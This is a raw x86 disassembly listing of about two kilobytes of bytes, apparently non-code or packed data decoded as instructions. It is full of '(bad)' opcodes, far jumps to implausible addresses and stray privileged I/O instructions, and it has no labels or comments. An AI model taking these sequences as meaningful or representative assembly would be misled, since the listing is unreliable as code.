  40bd2c:	jmp    0x9f17:0xbcdc3052
  40bd33:	call   0x4217983
  40bd38:	jecxz  0x40bd4b
  40bd3a:	adc    cl,ch
  40bd3c:	inc    eax
  40bd3d:	pushf  
  40bd3e:	xchg   edi,eax
  40bd3f:	(bad)  
  40bd40:	jmp    0xd7b6c697
  40bd45:	pop    esp
  40bd46:	mov    DWORD PTR [esi-0x5c],ebp
  40bd49:	cmp    ebx,ebp
  40bd4b:	jmp    0x43a151df
  40bd50:	das    
  40bd51:	aad    0x8
  40bd53:	push   esi
  40bd54:	jmp    0x203a:0xa44ef706
  40bd5b:	aam    0x8f
  40bd5d:	xchg   esp,eax
  40bd5e:	add    DWORD PTR [ecx],ebp
  40bd60:	repz and BYTE PTR [eax-0x7a],0xb7
  40bd65:	ror    DWORD PTR [eax],cl
  40bd67:	cs loop 0x40bd12
  40bd6a:	loopne 0x40bd16
  40bd6c:	jmp    0x40bdc0
  40bd6e:	neg    BYTE PTR [esi]
  40bd70:	xor    al,BYTE PTR [esi]
  40bd72:	not    DWORD PTR [esi]
  40bd74:	fs loop 0x40bd57
  40bd77:	(bad)  
  40bd79:	push   edx
  40bd7a:	neg    BYTE PTR [ecx-0x1e736cc]
  40bd80:	mov    cl,0xa0
  40bd82:	pop    eax
  40bd83:	imul   BYTE PTR [ecx+0x5ce09c]
	...
  40bd99:	add    BYTE PTR [eax],al
  40bd9b:	add    BYTE PTR [edi],ah
  40bd9d:	push   ebx
  40bd9e:	not    cl
  40bda0:	psrld  mm6,mm5
  40bda3:	fisubr WORD PTR [ebx]
  40bda5:	or     DWORD PTR [ebp-0x1eaccc29],edi
  40bdab:	pop    ds
  40bdac:	mov    bh,0x94
  40bdae:	or     BYTE PTR [edx-0x8],ch
  40bdb1:	xchg   ebx,eax
  40bdb2:	jp     0x40bd89
  40bdb4:	xchg   BYTE PTR [eax],ch
  40bdb6:	mov    ebp,0xa52f3b7
  40bdbb:	cdq    
  40bdbc:	(bad)  
  40bdbe:	or     ecx,DWORD PTR [edi]
  40bdc0:	adc    DWORD PTR [esi+eiz*1-0x1e69a2e6],ecx
  40bdc7:	sub    DWORD PTR [eax],edi
  40bdc9:	cmp    ebp,DWORD PTR [ecx+0x28]
  40bdcc:	mov    BYTE PTR [ecx-0x44],dl
  40bdcf:	add    BYTE PTR [ecx+0x1dfff73a],cl
  40bdd5:	push   esi
  40bdd6:	bound  eax,QWORD PTR [eax]
  40bdd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd9:	in     eax,0x60
  40bddb:	cmc    
  40bddc:	test   edi,edx
  40bdde:	or     bh,bh
  40bde0:	or     BYTE PTR ds:0x7042fff4,al
  40bde6:	mov    eax,0x5895a56c
  40bdeb:	push   0x47b8a7
  40bdf0:	rol    BYTE PTR [ebx],cl
  40bdf2:	mov    edx,0xee39c2fe
  40bdf7:	mov    eax,ds:0x5a089551
  40bdfc:	sbb    al,0x4e
  40bdfe:	mov    dh,0x75
	...
  40be14:	pop    ebp
  40be15:	dec    esi
  40be16:	fdiv   DWORD PTR [ebp+0x69]
  40be19:	dec    esi
  40be1a:	shl    DWORD PTR [ebx+edx*2-0x13],0xa5
  40be1f:	dec    eax
  40be20:	and    al,0x95
  40be22:	cmc    
  40be23:	jne    0x40be8e
  40be25:	ins    DWORD PTR es:[edi],dx
  40be26:	mov    ecx,0xf73a4283
  40be2b:	mov    ch,0x79
  40be2d:	cmp    dh,bh
  40be2f:	call   DWORD PTR ds:0x3283f16d
  40be35:	cmp    al,BYTE PTR [esi-0x1]
  40be38:	mov    eax,0x3175f5a8
  40be3d:	in     eax,0xf5
  40be3f:	jne    0x40be6e
  40be41:	ins    DWORD PTR es:[edi],dx
  40be42:	outs   dx,BYTE PTR ds:[esi]
  40be43:	cli    
  40be44:	sar    BYTE PTR [ecx],cl
  40be46:	out    dx,al
  40be47:	icebp  
  40be48:	ret    0xf739
  40be4b:	lea    ebp,[eax+0x53]
  40be4e:	hlt    
  40be4f:	jmp    DWORD PTR [edx]
  40be51:	in     eax,0xf5
  40be53:	mov    ch,0x71
  40be55:	aaa    
  40be56:	idiv   edi
  40be58:	std    
  40be59:	(bad)  [ecx+0x0]
  40be5c:	mov    WORD PTR [ebx],?
  40be5e:	mov    DWORD PTR [edi-0x1d7477d],edi
  40be64:	retf   
  40be65:	sbb    edi,ebp
  40be67:	mov    ah,0x0
  40be69:	shr    esi,1
  40be6b:	(bad)  
  40be6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6d:	stos   BYTE PTR es:[edi],al
  40be6e:	push   ecx
  40be6f:	add    BYTE PTR [edx+eax*8-0x46554848],cl
  40be76:	out    dx,al
  40be77:	out    0x0,eax
	...
  40be89:	add    BYTE PTR [eax],al
  40be8b:	add    ch,cl
  40be8d:	jno    0x40be7e
  40be8f:	inc    ch
  40be91:	jl     0x40beac
  40be93:	add    BYTE PTR [ecx],bh
  40be95:	mov    dh,0xdd
  40be97:	inc    BYTE PTR [ecx]
  40be99:	dec    edx
  40be9a:	out    dx,eax
  40be9b:	je     0x40be39
  40be9d:	mov    ?,WORD PTR [eax+0xc]
  40bea0:	jnp    0x40beb3
  40bea2:	repnz out 0xf9,eax
  40bea5:	sub    dh,0xfe
  40bea8:	push   ebp
  40bea9:	jl     0x40bea8
  40beab:	(bad)  
  40beac:	mov    eax,0x5082ddc2
  40beb1:	scas   al,BYTE PTR es:[edi]
  40beb2:	inc    esi
  40beb3:	(bad)  
  40beb4:	fnstenv [ecx-0x2e]
  40beb7:	mov    edx,0xaee9710
  40bebc:	dec    esp
  40bebd:	leave  
  40bebe:	or     BYTE PTR [edi+0x45],bl
  40bec1:	jl     0x40bec0
  40bec3:	push   DWORD PTR [edx]
  40bec5:	leave  
  40bec6:	sbb    eax,ebp
  40bec8:	test   cl,0xeb
  40becb:	(bad)  
  40becc:	xchg   edi,eax
  40becd:	std    
  40bece:	gs add eax,0xbcaf4bb
  40bed4:	mov    WORD PTR [esi+0x66],ds
  40bed7:	or     al,0xf4
  40bed9:	add    DWORD PTR [ebx-0x2],esi
  40bedc:	add    eax,DWORD PTR [ebx-0x36]
  40bedf:	je     0x40be6c
  40bee1:	aad    0x9b
  40bee3:	inc    edi
  40bee4:	dec    ebp
  40bee5:	cmp    eax,0x949874ed
  40beea:	xchg   edi,eax
  40beeb:	add    cl,BYTE PTR [edi]
  40beed:	push   eax
  40beee:	xchg   edi,eax
  40beef:	fld    DWORD PTR [eax]
	...
  40bf01:	add    BYTE PTR [eax],al
  40bf03:	add    BYTE PTR [ebp+0x58e4dfba],al
  40bf09:	mov    al,ds:0x500dee87
  40bf0e:	(bad)  
  40bf0f:	jnp    0x40bf59
  40bf11:	dec    eax
  40bf12:	sbb    BYTE PTR [edx-0x1b202aa5],ah
  40bf18:	cmp    BYTE PTR [eax-0x78],cl
  40bf1b:	fimul  WORD PTR ds:0x487b6f50
  40bf21:	dec    esp
  40bf22:	fcomp  st(1)
  40bf24:	cwde   
  40bf25:	xchg   esp,eax
  40bf26:	(bad)  
  40bf28:	cmp    al,0xcf
  40bf2a:	inc    esi
  40bf2b:	in     eax,0x14
  40bf2d:	(bad)  [ebx+0x5c]
  40bf30:	mov    WORD PTR [edi+ebx*8-0x41279bfd],fs
  40bf37:	in     al,0x72
  40bf39:	sbb    eax,0xc96af3ad
  40bf3e:	daa    
  40bf3f:	fsub   QWORD PTR [edx+0x13]
  40bf42:	pop    ss
  40bf43:	in     eax,0x86
  40bf45:	push   esp
  40bf46:	out    dx,eax
  40bf47:	jg     0x40bf59
  40bf49:	xchg   esp,eax
  40bf4a:	fild   WORD PTR [ebx]
  40bf4c:	dec    ebx
  40bf4d:	leave  
  40bf4e:	pop    es
  40bf4f:	pop    esp
  40bf50:	xor    al,0x51
  40bf52:	loopne 0x40bf57
  40bf54:	cmp    ecx,ecx
  40bf56:	sti    
  40bf57:	fcomi  st,st(1)
  40bf59:	mov    ecx,0x4c0f03df
  40bf5e:	loop   0x40bf54
  40bf60:	or     eax,edi
  40bf62:	fild   WORD PTR [ebx]
  40bf64:	mov    WORD PTR [ebx],ds
  40bf66:	pop    ebp
  40bf67:	call   0x40bf6c
	...
  40bf7c:	xchg   ebx,eax
  40bf7d:	(bad)  
  40bf7e:	fcomip st,st(4)
  40bf80:	cvttps2pi mm4,xmm0
  40bf83:	add    ecx,DWORD PTR [esp+edi*4-0x6bb29c7a]
  40bf8a:	or     BYTE PTR [esi],bl
  40bf8c:	shl    al,1
  40bf8e:	popa   
  40bf8f:	jmp    0x1e095b23
  40bf94:	jno    0x40bfe5
  40bf96:	jl     0x40bf39
  40bf98:	aaa    
  40bf99:	dec    edi
  40bf9a:	push   es
  40bf9b:	jmp    0x99bd0f2f
  40bfa0:	addr16 add eax,0xbc882841
  40bfa6:	retf   0x4f09
  40bfa9:	xchg   esp,eax
  40bfaa:	pop    ebp
  40bfab:	cmp    DWORD PTR [edx+edi*4],0xea4e908
  40bfb2:	jge    0x40bf75
  40bfb4:	test   al,0xc7
  40bfb6:	lock ror DWORD PTR [esi+0x4ec9bdbc],cl
  40bfbd:	xchg   esp,eax
  40bfbe:	pop    ebp
  40bfbf:	inc    ecx
  40bfc0:	(bad)  
  40bfc1:	mov    edx,0x460ce908
  40bfc6:	or     BYTE PTR [edx+ebp*4+0x68397c4d],dh
  40bfcd:	leave  
  40bfce:	cld    
  40bfcf:	inc    ecx
  40bfd0:	test   eax,0xbf26f612
  40bfd5:	sbb    ecx,ebx
  40bfd7:	adc    dl,BYTE PTR [esi-0x32]
  40bfda:	xor    al,dh
  40bfdc:	loop   0x40bf6f
  40bfde:	into   
  40bfdf:	jmp    0x40bfe1
	...
  40bff1:	add    BYTE PTR [eax],al
  40bff3:	add    bl,dl
  40bff5:	rol    BYTE PTR [ecx],cl
  40bff7:	sbb    esi,DWORD PTR [ebx-0x703c7769]
  40bffd:	(bad)  
  40bffe:	out    0xf6,al
  40c000:	mov    eax,ds:0xb9ee58a4
  40c005:	pushf  
  40c006:	loopne 0x40bfb6
  40c008:	cs dec edi
  40c00a:	not    cl
  40c00c:	scas   eax,DWORD PTR es:[edi]
  40c00d:	into   
  40c00e:	cmc    
  40c00f:	(bad)  
  40c010:	and    esp,DWORD PTR [eax+0x4f0054f5]
  40c016:	jl     0x40c018
  40c018:	inc    ebp
  40c019:	xor    bh,BYTE PTR [ebp+0x8]
  40c01c:	frstor [esi]
  40c01e:	hlt    
  40c01f:	(bad)  
  40c020:	cmp    dh,BYTE PTR ds:0x315cc03b
  40c026:	idiv   edi
  40c028:	sub    ah,BYTE PTR [edi-0x5c]
  40c02b:	cmp    dl,dh
  40c02d:	mov    ds:0x31fa688b,al
  40c032:	idiv   edi
  40c034:	mov    al,ds:0x8b55ee6c
  40c039:	xor    edi,esi
  40c03b:	inc    eax
  40c03d:	popa   
  40c03e:	out    dx,al
  40c03f:	dec    ebp
  40c040:	mov    ebx,0xa0fff732
  40c045:	imul   ebp,esi,0xf732ab45
  40c04b:	inc    eax
  40c04d:	ins    DWORD PTR es:[edi],dx
  40c04e:	out    dx,al
  40c04f:	cmp    eax,0xfff732bb
  40c054:	pusha  
  40c055:	inc    ecx
  40c056:	div    DWORD PTR [ebp+0x0]
	...
  40c069:	add    BYTE PTR [eax],al
  40c06b:	add    BYTE PTR [ecx+0x32],bh
  40c06e:	jge    0x40c078
  40c070:	fucom  st(6)
  40c072:	idiv   bh
  40c074:	mov    edx,0x49c2bfd1
  40c079:	xchg   ecx,eax
  40c07a:	pop    ebx
  40c07b:	mov    edi,DWORD PTR [ecx+0x15]
  40c07e:	retf   0x7ae8
  40c081:	jmp    0x40c09f
  40c083:	push   eax
  40c085:	inc    eax
  40c086:	out    dx,al
  40c087:	lea    ecx,[edi]
  40c089:	xchg   ecx,eax
  40c08a:	or     BYTE PTR [ebx],cl
  40c08c:	jne    0x40c07a
  40c08e:	pop    ebp
  40c08f:	push   0x25
  40c091:	mov    ecx,0x90e460cd
  40c096:	cmc    
  40c097:	jne    0x40c0de
  40c099:	xor    bh,BYTE PTR [ebp+0xc]
  40c09c:	cmp    eax,0x3aff894e
  40c0a1:	sahf   
  40c0a2:	enter  0x8c74,0x7c
  40c0a6:	cmp    al,0x50
  40c0a8:	hlt    
  40c0a9:	lock cmp dh,0x3
  40c0ad:	inc    edx
  40c0ae:	retf   0xbd73
  40c0b1:	les    eax,FWORD PTR [eax-0x18]
  40c0b4:	popaw  
  40c0b6:	loop   0x40c0f9
  40c0b8:	push   cs
  40c0b9:	(bad)  
  40c0ba:	jmp    0x61fe:0xf5aecc0a
  40c0c1:	xchg   ebx,eax
  40c0c2:	cmp    al,0xe8
  40c0c4:	mov    esp,0x5cfeeabb
  40c0c9:	push   ds
  40c0ca:	push   ecx
  40c0cb:	call   0x891d72c
	...
  40c0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0e5:	popa   
  40c0e6:	call   0xc75374e9
  40c0eb:	jl     0x40c098
  40c0ed:	mov    ebp,0xe2b474ea
  40c0f2:	into   
  40c0f3:	jl     0x40c090
  40c0f5:	in     eax,dx
  40c0f6:	loope  0x40c0b5
  40c0f8:	adc    esi,esp
  40c0fa:	jmp    0x7400:0xa358c67
  40c101:	xchg   DWORD PTR [eax-0x1],ebp
  40c104:	jnp    0x40c0cb
  40c106:	inc    eax
  40c107:	clc    
  40c108:	add    ecx,edi
  40c10a:	aad    0x4f
  40c10c:	imul   eax,DWORD PTR [ecx],0xfffffffa
  40c10f:	(bad)  
  40c110:	fld    DWORD PTR [ecx-0x1e]
  40c113:	shl    ebp,cl
  40c115:	cmp    eax,0x294c0b0a
  40c11a:	pop    edx
  40c11b:	(bad)  
  40c11c:	shr    DWORD PTR [ebp+0x3d8c0009],1
  40c122:	ret    
  40c123:	inc    esp
  40c124:	inc    eax
  40c125:	dec    ebx
  40c126:	add    BYTE PTR [eax],al
  40c128:	mov    WORD PTR [edi],ss
  40c12a:	or     ch,BYTE PTR [edx-0x74]
  40c12d:	pop    ss
  40c12e:	or     ch,BYTE PTR [edx-0x74]
  40c131:	xchg   esp,eax
  40c132:	jl     0x40c17b
  40c134:	and    ch,ah
  40c136:	(bad)  
  40c137:	push   edi
  40c138:	adc    al,0x4c
  40c13a:	push   ebp
  40c13b:	aam    0xa
  40c13d:	ret    0xecc3
  40c140:	xor    DWORD PTR [esi+0x548703df],edi
  40c146:	cmp    al,0x6
	...
  40c15c:	out    0x8e,eax
  40c15e:	inc    edi
  40c15f:	mov    cl,0x53
  40c161:	aad    0xdf
  40c163:	loopne 0x40c1bd
  40c165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c166:	xchg   edi,eax
  40c167:	push   es
  40c168:	or     eax,0x58e1974c
  40c16d:	dec    esp
  40c16e:	xor    ah,ch
  40c170:	pop    eax
  40c171:	adc    eax,0xd214e187
  40c176:	fwait
  40c177:	loope  0x40c1b9
  40c179:	lods   al,BYTE PTR ds:[esi]
  40c17a:	jbe    0x40c1d3
  40c17c:	cwde   
  40c17d:	dec    ebx
  40c17e:	cmc    
  40c17f:	out    dx,eax
  40c180:	stos   BYTE PTR es:[edi],al
  40c181:	rcl    ebx,0xe0
  40c184:	sbb    BYTE PTR [edi+edx*2+0x574b9afb],bl
  40c18b:	loope  0x40c1a5
  40c18d:	cmp    BYTE PTR [eax+0x1d],cl
  40c190:	or     DWORD PTR [edi+eax*2-0x1f],ecx
  40c194:	enter  0x5b44,0x81
  40c198:	jp     0x40c15b
  40c19a:	xor    ebp,esp
  40c19c:	aad    0xbd
  40c19e:	fild   WORD PTR [ebx]
  40c1a0:	imul   eax,ecx,0x37
  40c1a3:	in     al,dx
  40c1a4:	test   eax,0x44e12ec9
  40c1a9:	push   esi
  40c1aa:	cld    
  40c1ab:	add    edi,DWORD PTR [ecx+0x4f830c1f]
  40c1b1:	inc    eax
  40c1b2:	push   es
  40c1b3:	loope  0x40c1f7
  40c1b5:	mov    esi,0x4b706ddf
  40c1ba:	jge    0x40c1c7
  40c1bc:	and    al,0xd1
  40c1be:	or     BYTE PTR [ebx+0x0],dh
	...
  40c1d1:	add    BYTE PTR [eax],al
  40c1d3:	add    BYTE PTR [edx+ecx*2],ch
  40c1d6:	and    BYTE PTR [ebx+eax*2-0x507cf3ae],0xd5
  40c1de:	or     cl,ch
  40c1e0:	(bad)  
  40c1e1:	xchg   esp,eax
  40c1e2:	or     BYTE PTR [edx+edx*1+0x42],ah
  40c1e6:	test   esi,0xed60daec
  40c1ec:	mov    ss,WORD PTR [eax+ecx*1+0x8b33cd1]
  40c1f3:	jmp    0x28a87f6f
  40c1f8:	mov    BYTE PTR [edi+eiz*2+0x60944f08],bh
  40c1ff:	and    ch,BYTE PTR [edi-0x2b]
  40c202:	or     BYTE PTR [esi+0x284167a2],dl
  40c208:	mov    BYTE PTR [ebx+0x7c],cl
  40c20b:	icebp  
  40c20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c20d:	repnz idiv BYTE PTR [esi-0x54]
  40c211:	mov    dl,0x5f
  40c213:	or     BYTE PTR [edi-0x6c],cl
  40c216:	pusha  
  40c217:	or     BYTE PTR [edi],ch
  40c219:	aad    0x8
  40c21b:	sar    DWORD PTR [eax],1
  40c21d:	mov    ch,0x47
  40c21f:	jmp    0xe949584b
  40c224:	cmovnp edi,DWORD PTR [ecx+eiz*8+0x77]
  40c229:	push   ds
  40c22a:	test   DWORD PTR [esi+0x6c],0x6d368c19
  40c231:	dec    ebx
  40c232:	neg    BYTE PTR [ecx-0x169f1d89]
	...
  40c24c:	(bad)  
  40c250:	ins    BYTE PTR es:[edi],dx
  40c251:	rol    DWORD PTR [eax],0x11
  40c254:	push   edx
  40c255:	int3   
  40c256:	cmc    
  40c257:	push   ss
  40c258:	push   esi
  40c259:	push   esp
  40c25a:	or     eax,0xe51d7ae9
  40c25f:	add    BYTE PTR [ecx+edx*2+0x6a32fefa],ah
  40c266:	pusha  
  40c267:	add    BYTE PTR [edi],cl
  40c269:	jae    0x40c260
  40c26b:	jne    0x40c29a
  40c26d:	ds mov ah,0x79
  40c270:	xor    ch,BYTE PTR [edx-0x7f]
  40c273:	inc    ebp
  40c274:	xor    DWORD PTR [edi+0x1149e812],edi
  40c27a:	idiv   edi
  40c27c:	out    dx,al
  40c27d:	push   ebp
  40c27e:	jp     0x40c2a4
  40c280:	pop    ebp
  40c281:	mov    bh,0x67
  40c283:	inc    ecx
  40c284:	in     eax,0x85
  40c286:	loopne 0x40c2e8
  40c288:	jne    0x40c2f3
  40c28a:	not    DWORD PTR [eax+0x4d]
  40c28d:	nop
  40c28e:	sbb    bh,ch
  40c290:	jae    0x40c24a
  40c292:	mov    ds:0x5890a461,eax
  40c297:	jmp    FWORD PTR [eax+0x484be098]
  40c29d:	imul   esi,edi,0xf5b499e8
  40c2a3:	(bad)  
  40c2a4:	jmp    0x790:0x7460929b
  40c2ab:	add    BYTE PTR [ebp+0x858395],dh
	...
  40c2c1:	add    BYTE PTR [eax],al
  40c2c3:	add    BYTE PTR [edx],bh
  40c2c5:	push   0xfffffff7
  40c2c7:	call   ebp
  40c2c9:	mov    ebp,0x9575010c
  40c2ce:	loopne 0x40c2c9
  40c2d0:	dec    edx
  40c2d1:	xchg   ebp,eax
  40c2d2:	or     BYTE PTR [eax+0x5c],ch
  40c2d5:	mov    al,0x47
  40c2d7:	add    BYTE PTR [ebp-0x50],bl
  40c2da:	addr16 inc ecx
  40c2dc:	jne    0x40c29b
  40c2de:	jno    0x40c341
  40c2e0:	xor    al,0x95
  40c2e2:	cmc    
  40c2e3:	xor    eax,0x47d896
  40c2e8:	jb     0x40c2d5
  40c2ea:	add    al,ch
  40c2ec:	mov    WORD PTR [ebp+0x1343fee7],gs
  40c2f2:	gs popa 
  40c2f4:	int    0x3b
  40c2f6:	bound  esp,QWORD PTR [ecx-0x53]
  40c2f9:	cld    
  40c2fa:	or     DWORD PTR [eax-0x59],ebp
  40c2fd:	sbb    al,0x4d
  40c2ff:	add    BYTE PTR [ebp+edi*1+0x320c000a],dh
  40c306:	push   ecx
  40c307:	or     BYTE PTR [ecx+eax*1],ah
  40c30a:	jmp    0x80f0cf0d
  40c30f:	test   BYTE PTR [edx],0x5a
  40c312:	xlat   BYTE PTR ds:[ebx]
  40c313:	dec    edi
  40c314:	in     al,0x1c
  40c316:	outs   dx,DWORD PTR ds:[esi]
  40c317:	add    BYTE PTR [edx+ecx*1-0x781403af],cl
  40c31e:	add    al,0xe8
  40c320:	imul   eax,DWORD PTR [ebp+edx*8+0xdfcc5fe],0x0
	...
  40c33c:	cmp    esi,eax
  40c33e:	in     eax,0x80
  40c340:	shl    BYTE PTR [esi],1
  40c342:	aam    0xfe
  40c344:	ret    
  40c345:	xchg   esp,eax
  40c346:	or     al,0x6a
  40c348:	jb     0x40c35c
  40c34a:	push   ecx
  40c34b:	or     BYTE PTR [edx+eax*2-0x4c5400ab],ah
  40c352:	inc    eax
  40c353:	cld    
  40c354:	retf   
  40c355:	das    
  40c356:	jo     0x40c3b7
  40c358:	dec    ebp
  40c359:	cmp    ecx,DWORD PTR [edx]
  40c35b:	add    BYTE PTR [ebx+edi*1-0x1f7c7b67],cl
  40c362:	(bad)  
  40c363:	(bad)  
  40c364:	fcom   QWORD PTR [ebp+0xe]
  40c367:	add    DWORD PTR [ebp+edi*1+0x3deb71e2],ecx
  40c36e:	or     ch,BYTE PTR [eax+0x54]
  40c371:	pop    ebp
  40c372:	dec    ebp
  40c373:	add    ah,dh
  40c375:	mov    bh,0x6c
  40c377:	inc    ecx
  40c378:	mov    WORD PTR [edi+edx*4-0x202a12a6],ss
  40c37f:	fiadd  WORD PTR [eax-0x73bb579d]
  40c385:	inc    edi
  40c386:	popf   
  40c387:	or     esp,DWORD PTR [esp+edi*4]
  40c38a:	or     al,0xde
  40c38c:	xor    bh,BYTE PTR [ebp-0x6b329bc9]
  40c392:	xchg   DWORD PTR [ebp+0x6bdfd5ac],ebx
  40c398:	xchg   edi,eax
  40c399:	mov    ch,0x20
  40c39b:	add    al,0xa4
  40c39d:	xchg   edx,eax
  40c39e:	fild   WORD PTR [ebx]
	...
  40c3b4:	or     al,0x48
  40c3b6:	push   ebp
  40c3b7:	or     al,0xf4
  40c3b9:	xlat   BYTE PTR ds:[ebx]
  40c3ba:	(bad)  
  40c3bb:	(bad)  
  40c3bd:	sbb    DWORD PTR [ebp-0x2b],esp
  40c3c0:	icebp  
  40c3c1:	inc    edi
  40c3c2:	mov    bh,0x34
  40c3c4:	hlt    
  40c3c5:	stos   DWORD PTR es:[edi],eax
  40c3c6:	inc    esi
  40c3c7:	add    al,0x8c
  40c3c9:	inc    edi
  40c3ca:	cmp    eax,0xf7c1dae0
  40c3cf:	jmp    0x40c384
  40c3d1:	int3   
  40c3d2:	xchg   esi,eax
  40c3d3:	fst    st(4)
  40c3d5:	push   edx
  40c3d6:	in     al,0x3
  40c3d8:	pop    ecx
  40c3d9:	sbb    esi,DWORD PTR [ebx+eax*4-0x31]
  40c3dd:	inc    eax
  40c3de:	mov    ds,ebp
  40c3e0:	mov    dl,0xba
  40c3e2:	fild   QWORD PTR [ecx+0x73]
  40c3e5:	inc    edi
  40c3e6:	cmc    
  40c3e7:	or     esi,DWORD PTR [ebp+edx*1+0x1d9adcf8]
  40c3ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3ef:	(bad)  
  40c3f1:	xchg   ecx,eax
  40c3f2:	mov    DWORD PTR [ebp+ecx*8-0x6c],esp
  40c3f6:	fild   WORD PTR [ebx]
  40c3f8:	mov    WORD PTR [esp+edx*2+0x4f468287],ss
  40c3ff:	ffree  st(3)
  40c401:	mov    esp,0x948c02eb
  40c406:	or     BYTE PTR [ecx+0x75],al
  40c409:	mov    cl,0x8
  40c40b:	jmp    0xa8a8f6f7
  40c410:	(bad)  
  40c411:	mov    esp,0x94ce88d4
  40c416:	pusha  
  40c417:	xchg   edx,eax
	...
  40c42c:	scas   al,BYTE PTR es:[edi]
  40c42d:	aad    0x8
  40c42f:	push   cs
  40c430:	mov    ds:0x8fa84163,eax
  40c435:	inc    edi
  40c436:	jl     0x40c429
  40c438:	aaa    
  40c439:	xor    esi,ebp
  40c43b:	test   BYTE PTR [eax-0x51],0xea
  40c43f:	mov    dh,cl
  40c441:	xchg   esp,eax
  40c442:	pusha  
  40c443:	lds    ebp,FWORD PTR [esi+0x655108d5]
  40c449:	mov    ch,0x47
  40c44b:	jmp    0xe94956c7
  40c450:	cmovbe edi,DWORD PTR [ecx+esi*8-0x19]
  40c455:	dec    esi
  40c456:	cmc    
  40c457:	mov    esi,0xbe8c17c8
  40c45c:	rol    DWORD PTR [ebp-0xa],0x19
  40c460:	call   0x902a3387
  40c465:	inc    edi
  40c466:	jl     0x40c405
  40c468:	call   0x86c1c52c
  40c46d:	int3   
  40c46e:	cmc    
  40c46f:	mov    es,esi
  40c471:	push   esp
  40c472:	or     eax,0xe51b7ae9
  40c477:	push   0x76f742d3
  40c47c:	sar    BYTE PTR [eax+ecx*1+0x7c476803],0xf1
  40c484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c485:	dec    esp
  40c486:	jle    0x40c4e6
  40c488:	push   0x48554c1d
  40c48d:	xchg   ecx,eax
  40c48e:	xchg   edx,eax
  40c48f:	leave  
	...
  40c4a4:	into   
  40c4a5:	xchg   esp,eax
  40c4a6:	or     BYTE PTR [eax],al
  40c4a8:	gs xchg edx,eax
  40c4aa:	or     BYTE PTR [ebp-0xb9f10],cl
  40c4b0:	call   0x892:0x64046081
  40c4b7:	call   0x4974bd
  40c4bc:	sbb    eax,0x3541696c
  40c4c1:	mov    edx,0x91e461fa
  40c4c6:	pusha  
  40c4c7:	jnp    0x40c4cd
  40c4c9:	ror    DWORD PTR [eax],cl
  40c4cb:	jmp    eax
  40c4cd:	add    al,0x4e
  40c4cf:	inc    ecx
  40c4d0:	xor    eax,0x8d087d69
  40c4d5:	xchg   ah,dh
  40c4d7:	jmp    FWORD PTR [edx]
  40c4d9:	mov    ecx,0x90b461f2
  40c4de:	pusha  
  40c4df:	repnz push esp
  40c4e1:	iret   
  40c4e2:	or     BYTE PTR [eax+0x5e],ch
  40c4e5:	scas   eax,DWORD PTR es:[edi]
  40c4e6:	inc    edi
  40c4e7:	add    BYTE PTR [ebp-0x72],bl
  40c4ea:	or     BYTE PTR [eax],al
  40c4ec:	jne    0x40c557
  40c4ee:	jge    0x40c4f8
  40c4f0:	int    0xcf
  40c4f2:	hlt    
  40c4f3:	jmp    FWORD PTR [edx]
  40c4f5:	sbb    al,0x8d
  40c4f7:	imul   DWORD PTR [ebx]
  40c4f9:	push   0xfffffff7
  40c4fb:	push   eax
  40c4fc:	sbb    eax,0xb5006e9c
  40c501:	push   0x7d
  40c503:	cld    
  40c504:	or     ah,ah
  40c506:	add    al,ch
	...
  40c51c:	pop    ss
  40c51d:	loop   0x40c514
  40c51f:	(bad)  
  40c520:	fmul   QWORD PTR [esi+0xa]
  40c523:	add    BYTE PTR [eax-0xe7c1deb],al
  40c529:	ins    BYTE PTR es:[edi],dx
  40c52a:	pusha  
  40c52b:	add    BYTE PTR [edi+0x7d75f578],bh
  40c531:	cmp    DWORD PTR [edi+esi*2-0x74],edi
  40c535:	(bad)  
  40c537:	mov    cl,dl
  40c539:	xlat   BYTE PTR ds:[ebx]
  40c53a:	data16 add ah,ah
  40c53d:	cs ins BYTE PTR es:[edi],dx
  40c53f:	inc    ecx
  40c540:	mov    WORD PTR [ebx+0x1],fs
  40c543:	(bad)  
  40c544:	int    0x3b
  40c546:	shl    DWORD PTR [edi+edi*1],cl
  40c549:	repz dec esp
  40c54b:	add    BYTE PTR [edi+ebp*1+0x51],ah
  40c54f:	dec    DWORD PTR [ebx+0x42]
  40c552:	retf   0xa573
  40c555:	or     esp,DWORD PTR [edx+0x0]
  40c558:	mov    WORD PTR [esi-0x70],es
  40c55b:	arpl   WORD PTR [bx+di],bx
  40c55e:	dec    ebp
  40c55f:	add    BYTE PTR [esi+eax*2+0x3d340859],bh
  40c566:	lods   al,BYTE PTR ds:[esi]
  40c567:	(bad)  
  40c568:	sbb    edx,DWORD PTR [ebx+0x2e137a09]
  40c56e:	add    BYTE PTR fs:[ebp+ecx*4+0x6e],dh
  40c573:	inc    ecx
  40c574:	mov    ebx,ss
  40c576:	jmp    DWORD PTR [ecx+0x4d]
  40c579:	cmp    edx,ebx
  40c57b:	xor    al,0xdf
  40c57d:	or     BYTE PTR [ebx+0x0],0x0
	...
  40c591:	add    BYTE PTR [eax],al
  40c593:	add    ah,dh
  40c595:	inc    edx
  40c596:	push   ecx
  40c597:	jmp    ebx
  40c599:	xor    edx,ecx
  40c59b:	jae    0x40c612
  40c59d:	stos   DWORD PTR es:[edi],eax
  40c59e:	add    BYTE PTR fs:[esi+ebx*1-0x66849870],cl
  40c5a6:	dec    ebx
  40c5a7:	add    BYTE PTR [esi+ebx*1+0x59],bl
  40c5ab:	or     BYTE PTR [eax+esi*8+0x22b3feab],ah
  40c5b2:	mov    edi,0xd2c5ab78
  40c5b7:	je     0x40c559
  40c5b9:	mov    ebp,0x6ca40858
  40c5be:	pop    ecx
  40c5bf:	call   DWORD PTR [ebx-0x703ac76d]
  40c5c5:	xchg   esp,eax
  40c5c6:	mov    esp,0x2418778e
  40c5cb:	xlat   BYTE PTR ds:[ebx]
  40c5cc:	loope  0x40c5b9
  40c5ce:	leave  
  40c5cf:	add    esp,esi
  40c5d1:	outs   dx,BYTE PTR ds:[esi]
  40c5d2:	dec    esi
  40c5d3:	push   eax
  40c5d4:	xchg   esp,eax
  40c5d5:	sub    al,0x58
  40c5d7:	push   ecx
